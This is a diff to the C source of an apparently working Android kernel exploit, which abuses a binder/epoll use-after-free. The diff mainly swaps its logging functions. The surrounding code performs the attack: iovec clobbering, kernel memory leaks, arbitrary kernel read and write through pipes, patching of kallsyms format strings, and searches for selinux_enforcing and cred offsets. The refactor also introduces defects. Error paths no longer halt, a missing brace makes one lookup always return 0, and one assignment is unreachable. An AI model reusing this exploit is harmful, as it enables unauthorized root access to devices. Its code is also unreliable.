@@ -110,72 +110,63 @@ struct kallsyms {
     unsigned short token_index_data[256];
 } kallsyms;
 
-void message(char *fmt, ...)
-{
-    if (quiet)
-        return;
-    FILE* log_file = NULL;
-    char text[200];
-    char date[100];
-    time_t rtime = time(NULL);
+void doLog(int verbosity, int caller, char *fmt, ...) {
     va_list ap;
-    va_start(ap, fmt);
-    vsnprintf(text, 199, fmt, ap);
-    va_end(ap);
-    strftime(date, 100, "%T: ", localtime(&rtime));
-    text[198] = '\n';
-    text[199] = '\0';
-    log_file = fopen("/data/local/tmp/su98.log", "a");
-    if (log_file == NULL) log_file = fopen("/data/local/tmp/su99.log", "a");
-    if (log_file == NULL) log_file = fopen("./su98.log", "a");
-    if (log_file == NULL) log_file = fopen("./su99.log", "a");
-    if (log_file == NULL) log_file = fopen("/dev/kmsg", "a");
-    if (log_file != NULL) {
-        fputs(date, log_file);
-        fputs(text, log_file);
-        fputs("\n", log_file);
-        fsync(fileno(log_file));
-        sync();
-        fclose(log_file);
-        log_file = NULL;
-    } else {
-        printf("Failed to open log file!");
-    }
-    printf("%s\n", text);
-}
+    char date[100];
+    char msg[1024];
+    char log_buf[2048]; // Avoid buffer overflows.
 
-void error(char* fmt, ...)
-{
-    FILE* log_file = NULL;
-    char text[200];
-    char date[100];
-    time_t rtime = time(NULL);
-    va_list ap;
+    // Default to INFO and MAIN.
+    char *verb = "[INFO] ";
+    char *call = "[MAIN] ";
+
+    // Make sure we're not running under 'quiet' mode.
+    if (quiet) return;
+
+    // Parse the log message.
     va_start(ap, fmt);
-    vfprintf(stderr, fmt, ap);
-    vsnprintf(text, 199, fmt, ap);
+    vsnprintf(msg, sizeof(msg), fmt, ap);
     va_end(ap);
-    strftime(date, 100, "%T: ", localtime(&rtime));
-    text[198] = '\n';
-    text[199] = '\0';
-    log_file = fopen("/data/local/tmp/su98.log", "a");
-    if (log_file == NULL) log_file = fopen("/data/local/tmp/su99.log", "a");
-    if (log_file == NULL) log_file = fopen("./su98.log", "a");
-    if (log_file == NULL) log_file = fopen("./su99.log", "a");
-    if (log_file == NULL) log_file = fopen("/dev/kmsg", "a");
-    if (log_file != NULL) {
-        fputs(date, log_file);
-        fputs(text, log_file);
-        fputs("\n", log_file);
-        fsync(fileno(log_file));
-        sync();
-        fclose(log_file);
-        log_file = NULL;
-    } else {
-        printf("Failed to open log file!");
+
+    // Get the current time and convert it to a 'pretty' format.
+    time_t t = time(NULL);
+    strftime(date, 100, "[%T]: ", localtime(&t));
+
+    //
+    // Verbosity can be either 1 (INFO), 2 (WARNING) or 3 (ERROR).
+    // The caller can be either 1 (MAIN), 2 (PARENT) or 3 (CHILD).
+    //
+    if (verbosity == 1)
+        verb = "[INFO] ";
+    else if (verbosity == 2)
+        verb = "[WARN] ";
+    else if (verbosity == 3)
+        verb = "[ERROR] ";
+    if (caller == 1)
+        call = "[MAIN] ";
+    else if (caller == 2)
+        call = "[PARENT] ";
+    else if (caller == 3)
+        call = "[CHILD] ";
+
+    // We've got the date, the verbosity, the caller and the message.
+    // Join them as per the following format: '[DATE]: [VERBOSITY] [CALLER] MESSAGE'.
+    sprintf(log_buf, "%s%s%s%s\n", date, verb, call, msg);
+
+    // Print the result.
+    printf("%s", log_buf);
+
+#ifdef LOG_FILE
+    // If the log file is available, write the log to it.
+    FILE *log = fopen(LOG_FILE, "a");
+    if (log != NULL) {
+        fprintf(log, "%s", log_buf);
+        fclose(log);
     }
-    printf("FATAL: %s\n", text);
-    while(1)sleep(60);
+#endif
+
+    // Flush the buffer.
+    fflush(stdout);
 }
 
 int isKernelPointer(unsigned long p) {
@@ -212,17 +203,17 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
     int dummyBufferSize = MAX(UAF_SPINLOCK, PAGE);
     char *dummyBuffer = malloc(dummyBufferSize);
     if (dummyBuffer == NULL)
-        error( "allocating dummyBuffer");
+        doLog(3, 2, "allocating dummyBuffer");
 
     memset(dummyBuffer, 0, dummyBufferSize);
 
-    message("PARENT: clobbering at 0x%lx", payloadAddress);
+    doLog(1, 2, "clobbering at 0x%lx", payloadAddress);
 
     struct epoll_event event = {.events = EPOLLIN};
     int max_threads = 2;
     ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
     if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
-        error( "epoll_add");
+        doLog(3, 2, "epoll_add");
 
     unsigned long testDatum = 0;
     unsigned long const testValue = 0xABCDDEADBEEF1234ul;
@@ -261,25 +252,25 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
     int pipes[2];
     pipe(pipes);
     if ((fcntl(pipes[0], F_SETPIPE_SZ, PAGE)) != PAGE)
-        error( "pipe size");
+        doLog(3, 2, "pipe size");
     if ((fcntl(pipes[1], F_SETPIPE_SZ, PAGE)) != PAGE)
-        error( "pipe size");
+        doLog(3, 2, "pipe size");
 
     pid_t fork_ret = fork();
     if (fork_ret == -1)
-        error( "fork");
+        doLog(3, 2, "fork");
     if (fork_ret == 0)
     {
         /* Child process */
         prctl(PR_SET_PDEATHSIG, SIGKILL);
         usleep(DELAY_USEC);
-        message("CHILD: Doing EPOLL_CTL_DEL.");
+        doLog(1, 3, "Doing EPOLL_CTL_DEL.");
         epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
-        message("CHILD: Finished EPOLL_CTL_DEL.");
+        doLog(1, 3, "Done EPOLL_CTL_DEL.");
 
         char *f = malloc(totalLength);
         if (f == NULL)
-            error( "Allocating memory");
+            doLog(3, 3, "Allocating memory");
         memset(f, 0, paddingSize + UAF_SPINLOCK);
         unsigned long pos = paddingSize + UAF_SPINLOCK;
         memcpy(f + pos, second_write_chunk, sizeof(second_write_chunk));
@@ -289,7 +280,7 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
         memcpy(f + pos, &testValue, sizeof(testDatum));
         pos += sizeof(testDatum);
         write(pipes[1], f, pos);
-        message("CHILD: wrote %lu", pos);
+        doLog(1, 3, "CHILD: wrote %lu", pos);
         close(pipes[1]);
         close(pipes[0]);
         exit(0);
@@ -298,12 +289,12 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
     ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
     int b = readv(pipes[0], iovec_array, IOVEC_ARRAY_SZ);
 
-    message("PARENT: readv returns %d, expected %d", b, totalLength);
+    doLog(1, 2, "readv returns %d, expected %d", b, totalLength);
 
     if (testDatum != testValue)
-        message( "PARENT: **fail** clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
+        doLog(3, 2, "clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
     else
-        message("PARENT: clobbering test passed");
+        doLog(1, 2, "clobber value matches: is %lx", testDatum);
 
     free(dummyBuffer);
     close(pipes[0]);
@@ -325,7 +316,7 @@ int leak_data(void *leakBuffer, int leakAmount,
     int max_threads = 2;
     ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
     if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
-        error( "epoll_add");
+        doLog(3, 2, "epoll_ctl");
 
     struct iovec iovec_array[IOVEC_ARRAY_SZ];
 
@@ -350,7 +341,7 @@ int leak_data(void *leakBuffer, int leakAmount,
     unsigned char *dataBuffer = malloc(maxLength);
 
     if (dataBuffer == NULL)
-        error( "Allocating %ld bytes", maxLength);
+        doLog(3, 2, "Allocating %lu bytes", maxLength);
 
     for (int i = 0; i < IOVEC_ARRAY_SZ; i++)
         if (iovec_array[i].iov_base == (unsigned long *)0xDEADBEEF)
@@ -360,17 +351,17 @@ int leak_data(void *leakBuffer, int leakAmount,
     int pipefd[2];
     int leakPipe[2];
     if (pipe(pipefd))
-        error( "pipe");
+        doLog(3, 2, "pipe");
     if (pipe(leakPipe))
         err(2, "pipe");
     if ((fcntl(pipefd[0], F_SETPIPE_SZ, PAGE)) != PAGE)
-        error( "pipe size");
+        doLog(3, 2, "pipe size");
     if ((fcntl(pipefd[1], F_SETPIPE_SZ, PAGE)) != PAGE)
-        error( "pipe size");
+        doLog(3, 2, "pipe size");
 
     pid_t fork_ret = fork();
     if (fork_ret == -1)
-        error( "fork");
+        doLog(3, 2, "fork");
     if (fork_ret == 0)
     {
         /* Child process */
@@ -378,16 +369,16 @@ int leak_data(void *leakBuffer, int leakAmount,
 
         prctl(PR_SET_PDEATHSIG, SIGKILL);
         usleep(DELAY_USEC);
-        message("CHILD: Doing EPOLL_CTL_DEL.");
+        doLog(1, 3, "Doing EPOLL_CTL_DEL.");
         epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
-        message("CHILD: Finished EPOLL_CTL_DEL.");
+        doLog(1, 3, "Done EPOLL_CTL_DEL.");
 
         unsigned long size1 = paddingSize + UAF_SPINLOCK + minimumLeak;
-        message("CHILD: initial portion length 0x%lx", size1);
+        doLog(1, 3, "initial portion length 0x%lx", size1);
         char buffer[size1];
         memset(buffer, 0, size1);
         if (read(pipefd[0], buffer, size1) != size1)
-            error( "reading first part of pipe");
+            doLog(3, 3, "reading first part of pipe");
 
         memcpy(dataBuffer, buffer + size1 - minimumLeak, minimumLeak);
 
@@ -405,7 +396,7 @@ int leak_data(void *leakBuffer, int leakAmount,
         unsigned long task_struct_ptr = 0;
 
         memcpy(&task_struct_ptr, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
-        message("CHILD: task_struct_ptr = 0x%lx", task_struct_ptr);
+        doLog(1, 3, "task_struct_ptr = 0x%lx", task_struct_ptr);
 
         if (!badPointer && (extraLeakAmount > 0 || task_struct_plus_8_p != NULL))
         {
@@ -416,27 +407,27 @@ int leak_data(void *leakBuffer, int leakAmount,
                     extraLeakAmount,
                     task_struct_ptr + 8,
                     8};
-            message("CHILD: clobbering with extra leak structures");
+            doLog(1, 3, "clobbering with extra leak structures");
             if (clobber_data(addr, &extra, sizeof(extra)))
-                message("CHILD: clobbered");
+                doLog(1, 3, "clobbering worked");
             else {
-                message("CHILD: **fail** iovec clobbering didn't work");
+                doLog(3, 3, "clobbering failed");
                 childSuccess = 0;
             }
         }
 
         errno = 0;
         if (read(pipefd[0], dataBuffer + minimumLeak, adjLeakAmount - minimumLeak) != adjLeakAmount - minimumLeak)
-            error("leaking");
+            doLog(3, 3, "leak failed");
 
         write(leakPipe[1], dataBuffer, adjLeakAmount);
 
         if (extraLeakAmount > 0)
         {
-            message("CHILD: extra leak");
+            doLog(1, 3, "Leaking extra data...");
             if (read(pipefd[0], extraLeakBuffer, extraLeakAmount) != extraLeakAmount) {
                 childSuccess = 0;
-                error( "extra leaking");
+                doLog(3, 3, "Unable to read extra leak data");
             }
             write(leakPipe[1], extraLeakBuffer, extraLeakAmount);
         }
@@ -444,9 +435,9 @@ int leak_data(void *leakBuffer, int leakAmount,
         {
             if (read(pipefd[0], dataBuffer, 8) != 8) {
                 childSuccess = 0;
-                error( "leaking second field of task_struct");
+                doLog(3, 3, "Unable to leak second field of task_struct");
             }
-            message("CHILD: task_struct_ptr = 0x%lx", *(unsigned long *)dataBuffer);
+            doLog(1, 3, "task_struct_ptr = 0x%lx", *(unsigned long *)dataBuffer);
             write(leakPipe[1], dataBuffer, 8);
         }
         write(leakPipe[1], &childSuccess, 1);
@@ -455,30 +446,31 @@ int leak_data(void *leakBuffer, int leakAmount,
         close(pipefd[1]);
         close(leakPipe[0]);
         close(leakPipe[1]);
-        message("CHILD: Finished write to FIFO.");
+        doLog(1, 3, "Finished write to FIFO!");
 
         if (badPointer) {
             errno = 0;
-            message("CHILD: **fail** problematic address pointer, e.g., %lx", addr);
+            doLog(3, 3, "Problematic address pointer, e.g., %lx", addr);
         }
         exit(0);
     }
-    message("PARENT: soon will be calling WRITEV");
+
+    doLog(1, 2, "Soon will be calling WRITEV");
     errno = 0;
     ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
     b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
-    message("PARENT: writev() returns 0x%x", (unsigned int)b);
+    doLog(1, 2, "writev() returns 0x%x", (unsigned int)b);
     if (b != totalLength) {
-        message( "PARENT: **fail** writev() returned wrong value: needed 0x%lx", totalLength);
+        doLog(3, 2, "writev() returned wrong value: needed 0x%lx", totalLength);
         success = 0;
         goto DONE;
     }
 
-    message("PARENT: Reading leaked data");
+    doLog(1, 2, "Reading leaked data...");
 
     b = read(leakPipe[0], dataBuffer, adjLeakAmount);
     if (b != adjLeakAmount) {
-        message( "PARENT: **fail** reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);
+        doLog(2, 2, "read(0x%x) != 0x%lx", b, adjLeakAmount);
         success = 0;
         goto DONE;
     }
@@ -488,10 +480,10 @@ int leak_data(void *leakBuffer, int leakAmount,
 
     if (extraLeakAmount != 0)
     {
-        message("PARENT: Reading extra leaked data");
+        doLog(1, 2, "Reading extra leaked data");
         b = read(leakPipe[0], extraLeakBuffer, extraLeakAmount);
         if (b != extraLeakAmount) {
-            message( "PARENT: **fail** reading extra leak: read 0x%x needed 0x%lx", b, extraLeakAmount);
+            doLog(2, 2, "read(0x%x) != 0x%lx", b, extraLeakAmount);
             success = 0;
             goto DONE;
         }
@@ -500,7 +492,7 @@ int leak_data(void *leakBuffer, int leakAmount,
     if (task_struct_plus_8_p != NULL)
     {
         if (read(leakPipe[0], task_struct_plus_8_p, 8) != 8) {
-            message( "PARENT: **fail** reading leaked task_struct at offset 8");
+            doLog(3, 2, "Unable to read leaked task_struct at offset 8!");
             success = 0;
             goto DONE;
         }
@@ -526,7 +518,7 @@ DONE:
     free(dataBuffer);
 
     if (success)
-        message("PARENT: leaking successful");
+        doLog(1, 2, "Leaking successful!");
 
     return success;
 }
@@ -536,22 +528,22 @@ int leak_data_retry(void *leakBuffer, int leakAmount,
                     unsigned long *task_struct_ptr_p, unsigned long *task_struct_plus_8_p) {
     int try = 0;
     while (try < RETRIES && !leak_data(leakBuffer, leakAmount, extraLeakAddress, extraLeakBuffer, extraLeakAmount, task_struct_ptr_p, task_struct_plus_8_p)) {
-        message("MAIN: **fail** retrying");
+        doLog(3, 1, "%s: leak failed, retrying!", __func__);
         try++;
     }
     if (0 < try && try < RETRIES)
-        message("MAIN: it took %d tries, but succeeded", try);
+        doLog(1, 1, "%s: it took %d tries, but succeeded!", __func__, try);
     return try < RETRIES;
 }
 
 int clobber_data_retry(unsigned long payloadAddress, const void *src, unsigned long payloadLength) {
     int try = 0;
     while (try < RETRIES && !clobber_data(payloadAddress, src, payloadLength)) {
-        message("MAIN: **fail** retrying");
+        doLog(3, 1, "%s: clobber_data failed, retrying!", __func__);
         try++;
     }
     if (0 < try && try < RETRIES)
-        message("MAIN: it took %d tries, but succeeded", try);
+        doLog(1, 1, "%s: it took %d tries, but succeeded!", __func__, try);
     return try < RETRIES;
 }
 
@@ -566,12 +558,12 @@ void reset_kernel_pipes() {
     close(kernel_rw_pipe[0]);
     close(kernel_rw_pipe[1]);
     if (pipe(kernel_rw_pipe))
-        error( "kernel_rw_pipe");
+        doLog(1, 3, "kernel_rw_pipe failed");
 }
 
 int raw_kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
     if (len > PAGE)
-        error( "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
+        doLog(1, 3, "%s: kernel writes over PAGE_SIZE are messy, tried 0x%lx!", __func__, len);
     if (write(kernel_rw_pipe[1], buf, len) != len ||
         read(kernel_rw_pipe[0], (void *)kaddr, len) != len)
     {
@@ -583,12 +575,12 @@ int raw_kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
 
 void kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
     if (len != raw_kernel_write(kaddr, buf, len))
-        message( "error with kernel writing");
+        doLog(1, 3, "%s: error with kernel writing!", __func__);
 }
 
 int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
     if (len > PAGE)
-        error( "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
+        doLog(1, 3, "%s: kernel writes over PAGE_SIZE are messy, tried 0x%lx!", __func__, len);
     if (write(kernel_rw_pipe[1], (void *)kaddr, len) != len || read(kernel_rw_pipe[0], buf, len) != len)
     {
         reset_kernel_pipes();
@@ -599,9 +591,9 @@ int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
 
 void kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
     if (len > PAGE)
-        error( "kernel reads over PAGE_SIZE are messy, tried 0x%lx", len);
+        doLog(1, 3, "%s: kernel reads over PAGE_SIZE are messy, tried 0x%lx!", __func__, len);
     if (len != raw_kernel_read(kaddr, buf, len))
-        message( "error with kernel reading");
+        doLog(1, 3, "%s: error with kernel reading!", __func__);
 }
 
 unsigned char kernel_read_uchar(unsigned long offset) {
@@ -673,12 +665,11 @@ unsigned long findSelinuxEnforcingFromAvcDenied(unsigned long avc_denied_address
             {
                 unsigned int offset = ((instruction >> 10) & 0xFFF) << 2;
                 selinux_enforcing_address += offset;
-                message("selinux_enforcing address found");
                 return selinux_enforcing_address;
             }
         }
     }
-    message("selinux_enforcing address not found");
+    doLog(1, 3, "Unable to find selinux_enforcing address from avc_denied address!");
     return 0UL;
 }
 
@@ -702,8 +693,7 @@ int fixKallsymsFormatStrings(unsigned long start)
     unsigned long backwardAddress = start - PAGE;
     unsigned long page[PAGE / 8];
 
-    message("MAIN: searching for kallsyms format strings");
-
+    doLog(1, 1, "Searching for kallsyms format strings...");
     while ((backwards || forwards) && found < 2)
     {
         unsigned long address = direction > 0 ? forwardAddress : backwardAddress;
@@ -720,7 +710,7 @@ int fixKallsymsFormatStrings(unsigned long start)
             for (int i = 0; i < PAGE / 8; i++)
                 if (page[i] == searchTarget)
                 {
-                    message("MAIN: maybe matched format string! %lu", page[i]);
+                    doLog(1, 1, "Maybe matched format string! %lu", page[i]);
                     unsigned long a = address + 8 * i;
 
                     char fmt[16];
@@ -729,18 +719,18 @@ int fixKallsymsFormatStrings(unsigned long start)
 
                     if (!strcmp(fmt, "%pK %c %s\t[%s]\x0A"))
                     {
-                        message("MAIN: patching longer version at %lx", a);
+                        doLog(1, 1, "Patching longer version at %lx", a);
                         if (15 != raw_kernel_write(a, "%p %c %s\t[%s]\x0A", 15)) {
-                            message("MAIN: **fail** probably you have read-only const storage");
+                            doLog(3, 1, "Unable to patch longer version at %lx, you probably have read-only const storage!", a);
                             return found;
                         }
                         found++;
                     }
                     else if (!strcmp(fmt, "%pK %c %s\x0A"))
                     {
-                        message("MAIN: patching shorter version at %lx", a);
+                        doLog(1, 1, "Patching shorter version at %lx", a);
                         if (15 != raw_kernel_write(a, "%p %c %s\x0A", 10)) {
-                            message("MAIN: **fail** probably you have read-only const storage");
+                            doLog(3, 1, "Unable to patch shorter version at %lx, you probably have read-only const storage!", a);
                             return found;
                         }
                         found++;
@@ -767,7 +757,8 @@ int fixKallsymsFormatStrings(unsigned long start)
             direction = -1;
         }
     }
-    message("KASLR: found and replaced %d format strings", found);
+
+    doLog(1, 1, "KASLR: found and replaced %d format strings", found);
 
     return found;
 }
@@ -791,7 +782,7 @@ int getCredOffset(unsigned char* task_struct_data) {
     }
 
     errno = 0;
-    error("Cannot find cred structure");
+    doLog(1, 3, "Cannot find cred structure");
     return -1;
 }
 
@@ -890,10 +881,10 @@ int loadKallsyms() {
     if (!find_kallsyms_addresses(0, 0, &kallsyms.addresses, &kallsyms.num_syms))
         return 0;
 
-    message("MAIN: kallsyms names start at 0x%lx and have %ld entries", kallsyms.addresses, kallsyms.num_syms);
+    doLog(1, 1, "kallsyms addresses start at 0x%lx and have %ld entries", kallsyms.addresses, kallsyms.num_syms);
     unsigned long offset = kallsyms.addresses + 8 * kallsyms.num_syms;
 
-    message("MAIN: kallsyms names end at 0x%lx", offset);
+    doLog(1, 1, "kallsyms names end at 0x%lx", offset);
     unsigned long ost=offset;
     offset = (offset + 0xFFul) & ~0xFFul;
 
@@ -901,9 +892,9 @@ int loadKallsyms() {
     offset += 8;
 
     if (count != kallsyms.num_syms) {
-        message("MAIN: inconcistency in kallsyms table.");
+        doLog(3, 1, "inconistency in kallsyms table.");
         if (count - 20 > kallsyms.num_syms || count > kallsyms.num_syms) {
-            message("MAIN: **fail** kallsym entry count mismatch %ld", count);
+            doLog(3, 1, "kallsyms entry count mismatch %ld", count);
             have_base=1;
             if(kallsyms.num_syms<60000){skip1=ost;skip_base=search_base;}
             if(kallsyms.num_syms>70000)skip2=kallsyms.addresses;
@@ -944,7 +935,7 @@ int loadKallsyms() {
 
     errno = 0;
     if (kallsyms.token_table_data == NULL)
-        error("allocating token table");
+        doLog(3, 1, "Unable to allocate memory for the token table!");
 
     for (unsigned long i = 0 ; i < token_table_length ; i++)
         kallsyms.token_table_data[i] = kernel_read_uchar(kallsyms.token_table + i);
@@ -959,8 +950,8 @@ int loadKallsyms() {
 }
 
 unsigned long findSymbol_memory_search(char* symbol) {
-    if (! loadKallsyms()) {
-        message("MAIN: **fail** cannot find kallsyms table");
+    if (!loadKallsyms()) {
+        doLog(3, 1, "Unable to load kallsyms table!");
         return 0;
     }
 
@@ -972,8 +963,7 @@ unsigned long findSymbol_memory_search(char* symbol) {
         unsigned int n1 = get_kallsyms_name(offset, name);
         if (!strncmp(name+1, symbol, n) && (name[1+n] == '.' || !name[1+n])) {
             unsigned long address = kernel_read_ulong(kallsyms.addresses + i*8);
-            message( "MAIN: found %s in kernel memory at %lx", symbol, address);
-
+            doLog(1, 1, "Found %s in kernel memory at %lx!", symbol, address);
             return address;
         }
         offset += n1;
@@ -988,7 +978,7 @@ char* allocateSymbolCachePathName(char* symbol) {
     char* pathname = malloc(strlen(symbol)+7+1+n);
     if (pathname == NULL) {
         errno = 0;
-        error("allocating memory for pathname");
+        doLog(3, 1, "Unable to allocate memory for the pathname!");
     }
     strcpy(pathname, myPath);
     strcat(pathname, symbol);
@@ -1023,7 +1013,7 @@ void cacheSymbol(char* symbol, unsigned long address) {
             char* cmd = alloca(10+strlen(pathname)+1);
             sprintf(cmd, "chmod 666 %s", pathname);
             system(cmd);
-            message("cached %s", pathname);
+            doLog(1, 1, "Successfully cached %s!", pathname);
         }
         free(pathname);
     }
@@ -1068,7 +1058,7 @@ unsigned long findSymbol(unsigned long pointInKernelMemory, char *symbol)
             char sym[1024];
             sscanf(buf, "%lx %c %s", &a, &type, sym);
             if (!strncmp(sym, symbol, n) && (sym[n]=='.' || !sym[n])) {
-                message( "found %s in /proc/kallsyms", sym);
+                doLog(1, 1, "Found %s in /proc/kallsyms at %lx!", sym, a);
                 address = a;
                 break;
             }
@@ -1082,12 +1072,12 @@ unsigned long findSymbol(unsigned long pointInKernelMemory, char *symbol)
 }
 void kptrLeak(unsigned long task_struct_ptr) {
     for (int i=0; i<PAGE-16; i+=8) {
-        if (kernel_read_ulong(task_struct_ptr+i-8)>0xffffff0000000000){
-            message("searching at 0x%lx",kernel_read_ulong(task_struct_ptr+i-8));
+        if (kernel_read_ulong(task_struct_ptr+i-8)>0xffffff0000000000) {
+            doLog(1, 1, "Searching for kallsyms at 0x%lx", kernel_read_ulong(task_struct_ptr+i-8));
             unsigned long bk_search_base=search_base;
             search_base=kernel_read_ulong(task_struct_ptr+i-8);
             search_base = (search_base) & ~0xFFFFFul;
-            message("search_base (AND) 0x%lx",search_base);
+            doLog(1, 1, "search_base (AND) 0x%lx",search_base);
             loadKallsyms();
             if(have_base==0){search_base=bk_search_base;}
             if(good_base==1){return;}
@@ -1095,7 +1085,7 @@ void kptrLeak(unsigned long task_struct_ptr) {
             have_base=0;
         }
     }
-    message("kptrLeak finished");
+    doLog(1, 1, "kptrLeak finished!");
     return;
 }
 
@@ -1108,8 +1098,8 @@ void checkKernelVersion() {
         if (NULL != strstr(buf, "Linux version 4"))
             kernel3 = 0;
     }
-    if (kernel3) message("MAIN: detected kernel version 3");
-    else message("MAIN: detected kernel version other than 3");
+    if (kernel3) doLog(1, 1, "Detected kernel version 3!");
+    else doLog(1, 1, "Detected kernel version other than 3!");
 }
 
 // For devices with randomized thread_info located on stack
@@ -1117,9 +1107,9 @@ void checkKernelVersion() {
 unsigned long find_thread_info_ptr_kernel3(unsigned long kstack) {
     unsigned long kstack_data[16384/8];
 
-    message("MAIN: parsing kernel stack to find thread_info");
+    doLog(1, 1, "Searching for thread_info in kernel stack (0x%lx)...", kstack);
     if (!leak_data_retry(NULL, 0, kstack, kstack_data, sizeof(kstack_data), NULL, NULL))
-        error("Cannot leak kernel stack");
+        doLog(1, 1, "Failed to leak kernel stack!");
 
     for (unsigned int pos = 0; pos < sizeof(kstack_data)/8; pos++)
         if (kstack_data[pos] == USER_DS)
@@ -1131,9 +1121,10 @@ unsigned long find_thread_info_ptr_kernel3(unsigned long kstack) {
 unsigned long find_selinux_enforcing(unsigned long search_base) {
     unsigned long address = findSymbol(search_base, "selinux_enforcing");
     if (address == 0) {
-        message("MAIN: direct search didn't work, so searching via avc_denied");
+        doLog(1, 2, "Direct search didn't work, so searching via avc_denied!");
         address = findSymbol(search_base, "avc_denied");
         if (address == 0)
+            doLog(1, 3, "That didn't work either, so we're screwed :(!");
             return 0;
         address = findSelinuxEnforcingFromAvcDenied(address);
     }
@@ -1145,11 +1136,11 @@ unsigned long getCommOffset(unsigned long task_struct_ptr, char comm[16]) {
         char kcomm[16];
         kernel_read(ptr, kcomm, 16*8);
         kcomm[15] = '\0';
-        printf("kcomm = %s\n", kcomm);
+        doLog(1, 1, "kcomm = %s", kcomm);
         // Only compare the first 8 chars, because its easier.
         if (!strncmp(kcomm, comm, 15)) return ptr;
     }
-    error("Couldn't get the comm off!");
+    doLog(1, 3, "Couldn't find comm offset!");
     return -1;
 }
 
@@ -1157,7 +1148,7 @@ void getSelfComm(char *out) {
     FILE *fp = fopen("/proc/self/comm", "r");
     if (fp == NULL) error("self/comm open failed");
     size_t read = fread(out, sizeof(char), 16, fp);
-    if (!read) error("self/comm empty");
+    if (!read) doLog(1, 3, "Failed to read self/comm!");
     out[read] = '\0'; // We have a \n instead
 }
 
@@ -1165,21 +1156,25 @@ unsigned long get_kfiles(unsigned long task_struct_ptr, char comm[16]) {
     unsigned long base_ptr = getCommOffset(task_struct_ptr, comm);
     unsigned long files_ptr = 0;
     int tmp;
-    message("looking for kfiles offset");
+    doLog(1, 1, "base_ptr = 0x%lx", base_ptr);
+    doLog(1, 1, "Looking for kfiles offset...");
     for (unsigned long tmp_ptr = base_ptr + 8; tmp_ptr < base_ptr + 0xFF; tmp_ptr = tmp_ptr + 8)
         // If we successfully read an int, we found a pointer and probably the fs_struct.
         if (raw_kernel_read(tmp_ptr, &tmp, sizeof(tmp))) {
             break;
             files_ptr = tmp_ptr + 8;
         }
-    if (!files_ptr) error("Failed to get files_ptr");
-    message("found a ptr %lu", files_ptr);
+    if (!files_ptr)
+        doLog(1, 3, "Failed to find kfiles offset!");
+    doLog(1, 1, "kfiles offset = 0x%lx", files_ptr);
     unsigned long fdtab = kernel_read_ulong(files_ptr + 8);
-    if (!fdtab) error("Invalid fdtab");
-    message("got fdtab");
+    if (!fdtab)
+        doLog(1, 3, "Failed to find fdtab!");
+    doLog(1, 1, "fdtab = 0x%lx", fdtab);
     unsigned long fd_arr = kernel_read_ulong(fdtab + 8);
-    if (!fd_arr) error("Invalid fdarr");
-    message("got fdarr");
+    if (!fd_arr)
+        doLog(1, 3, "Failed to find fd_arr!");
+    doLog(1, 1, "fd_arr = 0x%lx", fd_arr);
     return fd_arr;
 }
 
@@ -1194,9 +1189,12 @@ struct kmalloc_hack_result {
 
 struct kmalloc_hack_result kmalloc(int size, unsigned long task_struct_ptr) {
     int files = MAX((size + KFILE_SIZE - 1) / KFILE_SIZE, 3); // 3 is the minimum to reliably find the size of a file.
-    message("kmalloc files %d", files);
-    if (files >= 64) error("Too much data allocating at once");
-    if (!files) error("No data allocating");
+
+    if (files >= 64)
+        doLog(1, 3, "Too many files to allocate!");
+    if (!files)
+        doLog(1, 3, "No files to allocate!");
+
     char comm[16];
     getSelfComm(comm);
     int fds[64] = {0}; // We can allocate a maximum of (64 * KFILE_SIZE), which is pretty big.
@@ -1207,41 +1205,44 @@ struct kmalloc_hack_result kmalloc(int size, unsigned long task_struct_ptr) {
     unsigned long kfile_ptr_diff, kfile_ptr_last_diff = 0;
     unsigned long fd_arr = get_kfiles(task_struct_ptr, comm);
     while (!worked) {
-        message("attempting to kmalloc");
+        doLog(1, 1, "Attempting to kmalloc %d files...", files);
         for (int i = 0; i < files; i++) {
             fds[i] = open("/dev/binder", O_RDONLY);
         }
-        message("fds open");
+        doLog(1, 1, "Opened file descriptors!");
         first_fd = fds[0];
         first_kfile_ptr = kernel_read_ulong(fd_arr + 8 * first_fd);
         worked = true;
         for (i = 0; i < files; i++) {
             fd = fds[i];
-            if (!fd) error("Failed (%d) to open a file (%d) for kmalloc workaround", i, fd);
+            if (!fd)
+                doLog(1, 3, "Failed (%d) to open a file (%d) for kmalloc workaround", i, fd);
             next_kfile_ptr = kernel_read_ulong(fd_arr + 8 * fd);
             if (!next_kfile_ptr) error("Failed to read kfile ptr");
             kfile_ptr_last_diff = kfile_ptr_diff;
             if (last_kfile_ptr) kfile_ptr_diff = next_kfile_ptr - last_kfile_ptr;
             if (kfile_ptr_last_diff && kfile_ptr_last_diff != kfile_ptr_diff) {
                 worked = false;
-                message("alloc non-contig:diff:%lu;last_diff:%lu;last_ptr:%lu", kfile_ptr_diff, kfile_ptr_last_diff, last_kfile_ptr);
+                doLog(1, 1, "Failed to allocate contiguous memory with kmalloc hack! (diff: %lu; last_diff: %lu; last_ptr: %lu)", kfile_ptr_diff, kfile_ptr_last_diff, last_kfile_ptr);
                 break; // Failed to allocate contiguous data, retry
             }
-            message("alloc contig:diff:%lu;last_ptr:%lu", kfile_ptr_diff, last_kfile_ptr);
